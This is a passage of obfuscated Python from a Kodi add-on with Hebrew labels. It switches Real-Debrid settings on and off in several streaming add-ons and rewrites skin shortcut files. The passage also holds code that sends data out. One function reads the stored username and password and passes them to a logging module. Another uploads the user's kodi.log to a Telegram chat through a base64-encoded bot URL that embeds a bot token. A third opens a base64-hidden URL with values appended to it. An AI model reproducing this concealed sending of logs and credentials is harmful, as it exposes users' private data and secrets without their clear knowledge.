          OO0O0OOOO000OO000 =urllib2 .urlopen (OO000OO00O0O0OOO0 .decode ('base64')+' - '+OOOOO0O0O000O0OOO +' - '+OO0O0O0OOOO00OO0O +' - '+OOO000O00O0OOO00O ).readlines ()#line:577
       except :pass #line:578
def googleindicat ():#line:581
			import logg #line:582
			OOO0OOOO0OOO000OO =(ADDON .getSetting ("pass"))#line:583
			O000O000O000OOO0O =(ADDON .getSetting ("user"))#line:584
			logg .logGA (OOO0OOOO0OOO000OO ,O000O000O000OOO0O )#line:585
def logsend ():#line:586
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:587
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:588
      howsentlog ()#line:590
      import requests #line:591
      if xbmc .getCondVisibility ('system.platform.windows'):#line:592
         O0OO0OO000OO00000 =xbmc .translatePath ('special://home/kodi.log')#line:593
         O000OO000000O00OO ={'chat_id':(None ,'-274262389'),'document':(O0OO0OO000OO00000 ,open (O0OO0OO000OO00000 ,'rb')),}#line:597
         O0O0O000O000OO0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:598
         OO000OO0O00O00OOO =requests .post (O0O0O000O000OO0O0 .decode ('base64'),files =O000OO000000O00OO )#line:600
      elif xbmc .getCondVisibility ('system.platform.android'):#line:601
           O0OO0OO000OO00000 =xbmc .translatePath ('special://temp/kodi.log')#line:602
           O000OO000000O00OO ={'chat_id':(None ,'-274262389'),'document':(O0OO0OO000OO00000 ,open (O0OO0OO000OO00000 ,'rb')),}#line:606
           O0O0O000O000OO0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:607
           OO000OO0O00O00OOO =requests .post (O0O0O000O000OO0O0 .decode ('base64'),files =O000OO000000O00OO )#line:609
      else :#line:610
           O0OO0OO000OO00000 =xbmc .translatePath ('special://kodi.log')#line:611
           O000OO000000O00OO ={'chat_id':(None ,'-274262389'),'document':(O0OO0OO000OO00000 ,open (O0OO0OO000OO00000 ,'rb')),}#line:615
           O0O0O000O000OO0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:616
           OO000OO0O00O00OOO =requests .post (O0O0O000O000OO0O0 .decode ('base64'),files =O000OO000000O00OO )#line:618
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:619
def rdoff ():#line:621
	OOOOO0O000OO00O00 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:622
	OOOOO0O000OO00O00 .setSetting ('rd.client_id','')#line:623
	OOOOO0O000OO00O00 .setSetting ('rd.secret','')#line:624
	OOOOO0O000OO00O00 .setSetting ('rdsource','false')#line:625
	OOOOO0O000OO00O00 .setSetting ('super_fast_type_toren','false')#line:626
	OOOOO0O000OO00O00 .setSetting ('rd.auth','false')#line:627
	OOOOO0O000OO00O00 .setSetting ('rd.refresh','false')#line:628
	OOOOO0O000OO00O00 .setSetting ('magnet','false')#line:629
	OOOOO0O000OO00O00 .setSetting ('torrent_server','false')#line:630
	OOOOO0O000OO00O00 =xbmcaddon .Addon ('script.module.resolveurl')#line:632
	OOOOO0O000OO00O00 .setSetting ('RealDebridResolver_client_id','')#line:633
	OOOOO0O000OO00O00 .setSetting ('RealDebridResolver_client_secret','')#line:634
	OOOOO0O000OO00O00 .setSetting ('RealDebridResolver_token','')#line:635
	OOOOO0O000OO00O00 .setSetting ('RealDebridResolver_refresh','')#line:636
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:637
		OOOOO0O000OO00O00 =xbmcaddon .Addon ('plugin.video.seren')#line:638
		OOOOO0O000OO00O00 .setSetting ('rd.client_id','')#line:640
		OOOOO0O000OO00O00 .setSetting ('rd.secret','')#line:641
		OOOOO0O000OO00O00 .setSetting ('rd.auth','')#line:642
		OOOOO0O000OO00O00 .setSetting ('rd.refresh','')#line:643
	if os .path .exists (os .path .join (ADDONS ,'plugin.video.gaia')):#line:644
		OOOOO0O000OO00O00 =xbmcaddon .Addon ('plugin.video.gaia')#line:645
		OOOOO0O000OO00O00 .setSetting ('accounts.debrid.realdebrid.id','')#line:646
		OOOOO0O000OO00O00 .setSetting ('accounts.debrid.realdebrid.secret','')#line:647
		OOOOO0O000OO00O00 .setSetting ('accounts.debrid.realdebrid.token','')#line:648
		OOOOO0O000OO00O00 .setSetting ('accounts.debrid.realdebrid.refresh','')#line:649
	resloginit .resloginit ('restore','all')#line:650
	OOO00OO0OO000OO0O =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:652
	OO0OO0O000OO00OOO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:653
	copyfile (OOO00OO0OO000OO0O ,OO0OO0O000OO00OOO )#line:654
def skindialogsettind18 ():#line:655
	try :#line:656
		O00OO0O0OOO0OOO00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:657
		O0O00O0O00OO0O0OO =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:658
		copyfile (O00OO0O0OOO0OOO00 ,O0O00O0O00OO0O0OO )#line:659
	except :pass #line:660
def rdon ():#line:661
	loginit .loginIt ('restore','all')#line:662
	OO00O0O0OO0O00O0O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:664
	OO0000OOO00O00OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:665
	copyfile (OO00O0O0OO0O00O0O ,OO0000OOO00O00OO0 )#line:666
def adults18 ():#line:668
  OO0OOO000O0O0O00O =(ADDON .getSetting ("adults"))#line:669
  if OO0OOO000O0O0O00O =='true':#line:670
    OOOOO0O0O0O000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:671
    with open (OOOOO0O0O0O000O00 ,'r')as O00OOOOO0OOOOOO00 :#line:672
      O0OOOOOOOOOOOOO0O =O00OOOOO0OOOOOO00 .read ()#line:673
    O0OOOOOOOOOOOOO0O =O0OOOOOOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:691
    with open (OOOOO0O0O0O000O00 ,'w')as O00OOOOO0OOOOOO00 :#line:694
      O00OOOOO0OOOOOO00 .write (O0OOOOOOOOOOOOO0O )#line:695
def rdbuildaddon ():#line:696
  O0OOO00O000OOO0OO =(ADDON .getSetting ("auto_rd"))#line:697
  if O0OOO00O000OOO0OO =='true':#line:698
    OOO0OOOO000O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:699
    with open (OOO0OOOO000O00O00 ,'r')as OO00O0O0O00OO0OO0 :#line:700
      O0O0OO000OOOOOOOO =OO00O0O0O00OO0OO0 .read ()#line:701
    O0O0OO000OOOOOOOO =O0O0OO000OOOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:719
    with open (OOO0OOOO000O00O00 ,'w')as OO00O0O0O00OO0OO0 :#line:722
      OO00O0O0O00OO0OO0 .write (O0O0OO000OOOOOOOO )#line:723
    OOO0OOOO000O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:727
    with open (OOO0OOOO000O00O00 ,'r')as OO00O0O0O00OO0OO0 :#line:728
      O0O0OO000OOOOOOOO =OO00O0O0O00OO0OO0 .read ()#line:729
    O0O0OO000OOOOOOOO =O0O0OO000OOOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:747
    with open (OOO0OOOO000O00O00 ,'w')as OO00O0O0O00OO0OO0 :#line:750
      OO00O0O0O00OO0OO0 .write (O0O0OO000OOOOOOOO )#line:751
    OOO0OOOO000O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:755
    with open (OOO0OOOO000O00O00 ,'r')as OO00O0O0O00OO0OO0 :#line:756
      O0O0OO000OOOOOOOO =OO00O0O0O00OO0OO0 .read ()#line:757
    O0O0OO000OOOOOOOO =O0O0OO000OOOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:775
    with open (OOO0OOOO000O00O00 ,'w')as OO00O0O0O00OO0OO0 :#line:778
      OO00O0O0O00OO0OO0 .write (O0O0OO000OOOOOOOO )#line:779
    OOO0OOOO000O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:783
    with open (OOO0OOOO000O00O00 ,'r')as OO00O0O0O00OO0OO0 :#line:784
      O0O0OO000OOOOOOOO =OO00O0O0O00OO0OO0 .read ()#line:785
    O0O0OO000OOOOOOOO =O0O0OO000OOOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:803
    with open (OOO0OOOO000O00O00 ,'w')as OO00O0O0O00OO0OO0 :#line:806
      OO00O0O0O00OO0OO0 .write (O0O0OO000OOOOOOOO )#line:807
    OOO0OOOO000O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:810
    with open (OOO0OOOO000O00O00 ,'r')as OO00O0O0O00OO0OO0 :#line:811
      O0O0OO000OOOOOOOO =OO00O0O0O00OO0OO0 .read ()#line:812
    O0O0OO000OOOOOOOO =O0O0OO000OOOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:830
    with open (OOO0OOOO000O00O00 ,'w')as OO00O0O0O00OO0OO0 :#line:833
      OO00O0O0O00OO0OO0 .write (O0O0OO000OOOOOOOO )#line:834
    OOO0OOOO000O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:836
    with open (OOO0OOOO000O00O00 ,'r')as OO00O0O0O00OO0OO0 :#line:837
      O0O0OO000OOOOOOOO =OO00O0O0O00OO0OO0 .read ()#line:838
    O0O0OO000OOOOOOOO =O0O0OO000OOOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:856
    with open (OOO0OOOO000O00O00 ,'w')as OO00O0O0O00OO0OO0 :#line:859
      OO00O0O0O00OO0OO0 .write (O0O0OO000OOOOOOOO )#line:860
    OOO0OOOO000O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:862
    with open (OOO0OOOO000O00O00 ,'r')as OO00O0O0O00OO0OO0 :#line:863
      O0O0OO000OOOOOOOO =OO00O0O0O00OO0OO0 .read ()#line:864
    O0O0OO000OOOOOOOO =O0O0OO000OOOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:882
    with open (OOO0OOOO000O00O00 ,'w')as OO00O0O0O00OO0OO0 :#line:885
      OO00O0O0O00OO0OO0 .write (O0O0OO000OOOOOOOO )#line:886
    OOO0OOOO000O00O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:889
    with open (OOO0OOOO000O00O00 ,'r')as OO00O0O0O00OO0OO0 :#line:890
      O0O0OO000OOOOOOOO =OO00O0O0O00OO0OO0 .read ()#line:891
    O0O0OO000OOOOOOOO =O0O0OO000OOOOOOOO .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:909
    with open (OOO0OOOO000O00O00 ,'w')as OO00O0O0O00OO0OO0 :#line:912
      OO00O0O0O00OO0OO0 .write (O0O0OO000OOOOOOOO )#line:913
def rdbuildinstall ():#line:916
  try :#line:917
   O0OOO0OOO0OOOO00O =(ADDON .getSetting ("auto_rd"))#line:918
   if O0OOO0OOO0OOOO00O =='true':#line:919
     OO0000OOO0000O00O =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:920
     OOOO0OO00OOOOOOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:921
     copyfile (OO0000OOO0000O00O ,OOOO0OO00OOOOOOO0 )#line:922
  except :#line:923
     pass #line:924
def rdbuildaddonoff ():#line:927
    O0O00O00O00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:930
    with open (O0O00O00O00O0OO00 ,'r')as OOOOO0O0000000OOO :#line:931
      O0OO0O0OOOO000000 =OOOOO0O0000000OOO .read ()#line:932
    O0OO0O0OOOO000000 =O0OO0O0OOOO000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:950
    with open (O0O00O00O00O0OO00 ,'w')as OOOOO0O0000000OOO :#line:953
      OOOOO0O0000000OOO .write (O0OO0O0OOOO000000 )#line:954
    O0O00O00O00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:958
    with open (O0O00O00O00O0OO00 ,'r')as OOOOO0O0000000OOO :#line:959
      O0OO0O0OOOO000000 =OOOOO0O0000000OOO .read ()#line:960
    O0OO0O0OOOO000000 =O0OO0O0OOOO000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:978
    with open (O0O00O00O00O0OO00 ,'w')as OOOOO0O0000000OOO :#line:981
      OOOOO0O0000000OOO .write (O0OO0O0OOOO000000 )#line:982
    O0O00O00O00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:986
    with open (O0O00O00O00O0OO00 ,'r')as OOOOO0O0000000OOO :#line:987
      O0OO0O0OOOO000000 =OOOOO0O0000000OOO .read ()#line:988
    O0OO0O0OOOO000000 =O0OO0O0OOOO000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1006
    with open (O0O00O00O00O0OO00 ,'w')as OOOOO0O0000000OOO :#line:1009
      OOOOO0O0000000OOO .write (O0OO0O0OOOO000000 )#line:1010
    O0O00O00O00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1014
    with open (O0O00O00O00O0OO00 ,'r')as OOOOO0O0000000OOO :#line:1015
      O0OO0O0OOOO000000 =OOOOO0O0000000OOO .read ()#line:1016
    O0OO0O0OOOO000000 =O0OO0O0OOOO000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1034
    with open (O0O00O00O00O0OO00 ,'w')as OOOOO0O0000000OOO :#line:1037
      OOOOO0O0000000OOO .write (O0OO0O0OOOO000000 )#line:1038
    O0O00O00O00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1041
    with open (O0O00O00O00O0OO00 ,'r')as OOOOO0O0000000OOO :#line:1042
      O0OO0O0OOOO000000 =OOOOO0O0000000OOO .read ()#line:1043
    O0OO0O0OOOO000000 =O0OO0O0OOOO000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1061
    with open (O0O00O00O00O0OO00 ,'w')as OOOOO0O0000000OOO :#line:1064
      OOOOO0O0000000OOO .write (O0OO0O0OOOO000000 )#line:1065
    O0O00O00O00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1067
    with open (O0O00O00O00O0OO00 ,'r')as OOOOO0O0000000OOO :#line:1068
      O0OO0O0OOOO000000 =OOOOO0O0000000OOO .read ()#line:1069
    O0OO0O0OOOO000000 =O0OO0O0OOOO000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1087
    with open (O0O00O00O00O0OO00 ,'w')as OOOOO0O0000000OOO :#line:1090
      OOOOO0O0000000OOO .write (O0OO0O0OOOO000000 )#line:1091
    O0O00O00O00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1093
    with open (O0O00O00O00O0OO00 ,'r')as OOOOO0O0000000OOO :#line:1094
      O0OO0O0OOOO000000 =OOOOO0O0000000OOO .read ()#line:1095
    O0OO0O0OOOO000000 =O0OO0O0OOOO000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1113
    with open (O0O00O00O00O0OO00 ,'w')as OOOOO0O0000000OOO :#line:1116
      OOOOO0O0000000OOO .write (O0OO0O0OOOO000000 )#line:1117
    O0O00O00O00O0OO00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1120
    with open (O0O00O00O00O0OO00 ,'r')as OOOOO0O0000000OOO :#line:1121
      O0OO0O0OOOO000000 =OOOOO0O0000000OOO .read ()#line:1122
    O0OO0O0OOOO000000 =O0OO0O0OOOO000000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1140
    with open (O0O00O00O00O0OO00 ,'w')as OOOOO0O0000000OOO :#line:1143
      OOOOO0O0000000OOO .write (O0OO0O0OOOO000000 )#line:1144
def rdbuildinstalloff ():#line:1147
    try :#line:1148
       O000O0O00000O000O =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1149
       O0000000O0O0OO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1150
       copyfile (O000O0O00000O000O ,O0000000O0O0OO00O )#line:1152
       O000O0O00000O000O =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1154
       O0000000O0O0OO00O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1155
       copyfile (O000O0O00000O000O ,O0000000O0O0OO00O )#line:1157
       O000O0O00000O000O =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1159
       O0000000O0O0OO00O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1160
       copyfile (O000O0O00000O000O ,O0000000O0O0OO00O )#line:1162
       O000O0O00000O000O =ADDONPATH +"/resources/rdoff/Splash.png"#line:1165
       O0000000O0O0OO00O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1166
       copyfile (O000O0O00000O000O ,O0000000O0O0OO00O )#line:1168
    except :#line:1170
       pass #line:1171
def rdbuildaddonON ():#line:1178
    O0O00OOOO0O00O00O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1180
    with open (O0O00OOOO0O00O00O ,'r')as OO000O000OO0OO00O :#line:1181
      O0OOOO00OOOO00O00 =OO000O000OO0OO00O .read ()#line:1182
    O0OOOO00OOOO00O00 =O0OOOO00OOOO00O00 .replace ('''	<shortcut>
		<defaultID />
